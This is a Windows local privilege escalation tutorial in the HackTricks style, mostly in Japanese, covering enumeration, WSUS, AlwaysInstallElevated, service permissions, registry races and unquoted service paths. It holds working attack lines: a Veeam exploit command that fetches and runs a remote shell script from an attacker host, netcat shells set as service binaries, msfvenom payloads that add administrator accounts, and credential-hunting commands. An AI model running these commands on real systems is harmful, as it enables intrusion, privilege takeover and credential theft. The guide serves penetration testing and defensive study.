# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクターを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初期 Windows 理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細は以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が何か分からない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、システムの列挙、実行ファイルの実行、あるいは **あなたの活動を検知** するのを妨げる可能性のある、さまざまなものがあります。権限昇格の列挙を始める前に、以下の **ページ** を **読んで**、これらすべての **防御** **機構** を **列挙** してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` 経由で起動された UIAccess プロセスは、AppInfo の secure-path チェックを回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass ワークフローはこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop の accessibility registry propagation は、任意の SYSTEM registry write (RegPwn) に悪用できます:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、特権を持つローカル NTLM authentication が再利用された SMB TCP connection を介して反映される **SMB arbitrary-port** LPE パスも導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows の version に既知の vulnerability があるか確認してください（適用済みの patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft のセキュリティ脆弱性について詳細情報を検索するのに便利です。このデータベースには 4,700 件以上のセキュリティ脆弱性があり、Windows 環境が持つ **巨大な attack surface** を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env 変数に credential/Juicy な情報は保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) でこれを有効にする方法を学べます
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプライン実行の詳細が記録され、実行されたコマンド、コマンド呼び出し、およびスクリプトの一部が含まれます。ただし、実行の全詳細や出力結果は取得されない場合があります。

これを有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Powershell Transcription"** ではなく **"Module Logging"** を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShellログの最後の15件のイベントを表示するには、次を実行できます:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティと全内容の記録が取得され、各コードブロックが実行されるたびに文書化されることが保証されます。このプロセスは、各アクティビティの包括的な監査証跡を保持し、フォレンジックや悪意ある挙動の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な洞察が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の 20 件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

アップデートが http**S** ではなく http で要求されている場合、システムを侵害できます。

まず、cmd で次のコマンドを実行して、ネットワークが非SSLの WSUS update を使用しているか確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または PowerShell では次のとおりです:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
If you get a reply such as one of these:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドをSYSTEMとして実行します。
## KrbRelayUp

Windows **domain** 環境では、特定の条件下で **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing** が強制されていない環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる self-rights を持っていること、そしてユーザーが domain 内にコンピュータを作成できることが含まれます。重要なのは、これらの **requirements** は **default settings** で満たされるという点です。

**exploit** は [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) にあります。

攻撃の流れの詳細については [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください。

## AlwaysInstallElevated

この 2 つの register が **enabled** されている場合（値が **0x1**）、権限に関係なく、どのユーザーでも `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用して、現在のディレクトリ内に権限昇格用の Windows MSI バイナリを作成します。このスクリプトは、ユーザー/グループの追加を促す事前コンパイル済みの MSI インストーラを書き出します（そのため、GIU アクセスが必要になります）：
```
Write-UserAddMSI
```
特権を昇格するために、作成した binary をそのまま実行します。

### MSI Wrapper

この tools を使って MSI wrapper を作成する方法については、この tutorial を読んでください。**.bat** ファイルは、**command lines を実行したいだけ**なら、そのまま wrap できます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit で、`C:\privesc\beacon.exe` に **新しい Windows EXE TCP payload** を **Generate** します。
- **Visual Studio** を開き、**Create a new project** を選び、検索ボックスに "installer" と入力します。**Setup Wizard** project を選択して **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** のように設定し、場所に **`C:\privesc`** を使い、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- 3/4 ステップ目（含める files を選択）に進むまで **Next** をクリックし続けます。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** project を選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、インストールされた app をより正規に見せられる他の properties も変更できます。
- project を右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、`beacon.exe` file を選択して **OK** をクリックします。これにより、installer が実行されるとすぐに beacon payload が実行されることが保証されます。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**build it** します。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、platform を x64 に設定したことを確認してください。

### MSI Installation

悪意のある `.msi` file の **installation** を **background** で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、_exploit/windows/local/always_install_elevated_ を使用できます。

## Antivirus and Detectors

### Audit Settings

これらの設定は、何が**記録**されるかを決定するので、注意してください
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されるかを知っておくと便利です
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**のために設計されており、ドメインに参加しているコンピュータごとに各パスワードが**一意で、ランダム化され、定期的に更新**されることを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーだけがアクセスでき、許可されていればローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS** (Local Security Authority Subsystem Service) に保存されます。\
[**WDigest の詳細はこちら**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスによる **メモリの読み取り** やコード注入の試みを **ブロック** して、システムをさらに保護しています。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks のような脅威からデバイスに保存された credentials を保護することです。| [**Credentials Guard についての詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた認証情報

**Domain credentials** は **Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーの domain credentials が確立されます。\
[**Cached Credentials の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Enumerate Users & Groups

所属しているグループの中に、興味深い権限を持つものがないか確認してください
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**特権グループのいずれかに属している**場合、**権限昇格できる可能性があります**。特権グループについて学び、それらを悪用して権限昇格する方法はここを参照してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**tokenとは何か**については、このページでさらに学んでください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページで**興味深いtoken**について学び、それらをどう悪用するかを確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン中のユーザー / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

まず、プロセスを一覧表示し、**プロセスのコマンドライン内にパスワードが含まれていないか確認**してください。\
実行中のバイナリを**上書きできるか**、またはバイナリのフォルダに書き込み権限があるかを確認し、可能な [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用してください:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリのフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump** from sysinternals を使って、実行中のプロセスのメモリダンプを作成できます。FTP のようなサービスは、**credentials がメモリ内に平文で存在**するため、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM で実行されている Applications は、user が CMD を起動したり、directories を参照できるようにする場合があります。**

Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Services

Service Triggers により、Windows は特定の conditions が発生したときに service を start できます (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.)。SERVICE_START 権限がなくても、trigger を発火させることで privileged services を start できることがよくあります。enumeration と activation techniques はこちらを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

Get a list of services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使ってサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことが推奨されます。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" が任意の service を変更できるか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP用のaccesschk.exeはここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化

次のエラーが出る場合（例: SSDPSRV）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次の方法で有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1 では、サービス upnphost は動作するために SSDPSRV に依存しています**

**別の回避策**として、次を実行します:
```
sc.exe config usosvc start= auto
```
### **サービスの binary path を変更する**

"Authenticated users" グループがある service に対して **SERVICE_ALL_ACCESS** を持っている場合、service の executable binary を変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
さまざまな権限を通じて権限昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービス binary の再設定を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、サービス設定を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を許可します。
- **GENERIC_WRITE**: サービス設定を変更する能力を継承します。
- **GENERIC_ALL**: サービス設定を変更する能力も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

サービスが **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, または特権のあるドメインアカウントで実行されているにもかかわらず、**低権限ユーザーがサービス EXE またはその親フォルダを変更できる** 場合、**バイナリを置き換えてサービスを再起動する**ことで、そのサービスを乗っ取れることがよくあります。

**サービスによって実行される binary を変更できるか**、または binary が配置されているフォルダに **書き込み権限があるか** を確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic** を使うと、サービスによって実行されるすべての binary を取得できます（system32 ではないもの）。また、**icacls** を使って権限を確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** と **icacls** も使用できます:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**, **`BUILTIN\Users`**, または **`Authenticated Users`** に付与された危険な ACL を探してください。特に、サービス実行ファイルまたはそれを含むディレクトリに対する **`(F)`**, **`(M)`**, **`(W)`** に注意してください。実用的な悪用フローは次のとおりです:

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認する。
2. `icacls <path>` でバイナリが書き込み可能か確認する。
3. サービスバイナリを payload または有効な malicious service binary に置き換える。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動する（または再起動 / service trigger を待つ）。

便利な自動チェック:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスが通常ユーザーによる再起動を許可しない場合は、起動時に自動開始するか、失敗時のアクションで再起動されるか、またはそれを使用するアプリケーション経由で間接的にトリガーできるかを確認してください。

### Services registry modify permissions

サービス registry を変更できるかどうかを確認してください。\
以下で、サービス registry に対する **権限** を **チェック** できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。持っている場合、サービスによって実行されるバイナリを変更できます。

実行されるバイナリの Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成し、後で **SYSTEM** プロセスによって HKLM のセッションキーへコピーされます。registry の **symbolic link race** を使うと、この特権的な書き込み先を **任意の HKLM パス** に向け直せるため、任意の HKLM **value write** の primitive を得られます。

主要な場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` はインストール済みの accessibility features を列挙します。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` はユーザー制御可能な configuration を保存します。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop の遷移中に作成され、ユーザーが書き込み可能です。

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM に書き込ませたい **HKCU ATConfig** value を設定します。
2. secure-desktop のコピーをトリガーします（例: **LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を置いて **race** に勝ちます。oplock が発火したら、**HKLM Session ATConfig** キーを保護された HKLM のターゲットへの **registry link** に置き換えます。
4. SYSTEM が、攻撃者が選んだ value をリダイレクト先の HKLM パスへ書き込みます。

任意の HKLM value write を得たら、service configuration values を上書きして LPE に進みます:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常ユーザーが開始できる service（例: **`msiserver`**）を選び、書き込み後にそれをトリガーします。**Note:** 公開されている exploit 実装は race の一部として **locks the workstation** します。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、すべての unquoted service paths を列挙してください:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit で検出・悪用できます: `exploit/windows/local/trusted\_service\_path` metasploit で service binary を手動で作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows allows users to specify actions to be taken if a service fails. この機能は binary を指すように設定できます。もしこの binary が置き換え可能なら、privilege escalation が可能かもしれません。詳細は [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) を参照してください。

## Applications

### Installed Applications

**binaries の permissions**（1つを上書きして privilege escalation できるかもしれません）と、**folders** の permissions（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
